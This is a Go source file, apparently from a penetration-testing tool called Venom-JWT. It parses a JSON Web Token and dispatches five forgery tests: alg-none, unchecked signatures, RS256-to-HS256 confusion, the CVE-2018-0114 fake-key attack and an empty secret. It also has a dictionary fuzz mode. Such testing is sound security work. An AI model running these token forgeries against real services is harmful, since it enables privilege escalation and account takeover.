package service

import (
	"Venom-JWT/model"
	"Venom-JWT/utils"
	"github.com/gookit/color"
	"os"
	"strings"
)

// 解析JWT的各个参数并打印，并且返回第一段和第三段的处理结果
func JwtParseService(jwtStr string) (*model.Jwt, string, string) {
	jwt, err := utils.ParseJWT(jwtStr)
	if err != nil {
		color.Println("<red>[-]</>" + err.Error() + "\n")
		os.Exit(1)
	}
	// 打印JWT解析结果
	color.Println("<magentaB>[+]</>" + jwt.ToString() + "\n")
	return jwt, utils.GetJwtBodyStr(jwtStr, 1), utils.GetJwtBodyStr(jwtStr, 3)
}

// 全执行测试
func jwtChangeAllTestDo(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, pemPath string) {
	// 第一种情况：是HS256修改alg为none
	JwtAlgNoneService(jwt)
	// 第二种情况：未验证签名导致的越权
	JwtWithNoCheck(firstBodyStr, jwt.Payload, thirdBodyStr)
	// 第三种情况：将 alg 由 RS256 更改为 HS256
	JwtModifyAsymToSym(jwt, pemPath)
	// 第四种情况：伪造密钥(CVE-2018-0114)攻击
	JwtWithFakeKey(jwt.Payload)
	// 第五种情况：空密钥
	JwtNullSecret(firstBodyStr, jwt.Payload)

}

// 选择执行模式
func jwtChooseChangeTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, state int, pemPath string) {
	switch state {
	case 1:
		JwtAlgNoneService(jwt) // 第一种情况：是HS256修改alg为none
	case 2:
		JwtWithNoCheck(firstBodyStr, jwt.Payload, thirdBodyStr) // 第二种情况：未验证签名导致的越权
	case 3:
		JwtModifyAsymToSym(jwt, pemPath) // 第三种情况：将 alg 由 RS256 更改为 HS256
	case 4:
		JwtWithFakeKey(jwt.Payload) // 第四种情况：伪造密钥(CVE-2018-0114)攻击
	case 5:
		JwtNullSecret(firstBodyStr, jwt.Payload) // 第五种情况：空密钥
	default:
		jwtChangeAllTestDo(jwt, firstBodyStr, thirdBodyStr, pemPath) // 全执行测试
	}
}

// 修改Payload时进行越权测试
func JwtChangeTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, state int, pemPath string) {
	color.Println("<lightRedB>==============没secret修改Payload的越权测试===========</>\n")
	jwtChooseChangeTest(jwt, firstBodyStr, thirdBodyStr, state, pemPath)
}

// FUZZ模式的Payload越权测试
func JwtChangeFuzzTest(jwt model.Jwt, firstBodyStr string, thirdBodyStr string, state int, dictArr []string, pemPath string) {
	color.Println("<lightRedB>==============没secret修改Payload的FUZZ越权测试===========</>\n")
	for _, dictStr := range dictArr {
		var copyJwt = model.Jwt{Header: jwt.Header, Payload: strings.Replace(jwt.Payload, "FUZZ", dictStr, -1), Message: jwt.Message, Signature: jwt.Signature}
		jwtChooseChangeTest(copyJwt, firstBodyStr, thirdBodyStr, state, pemPath)
	}
}
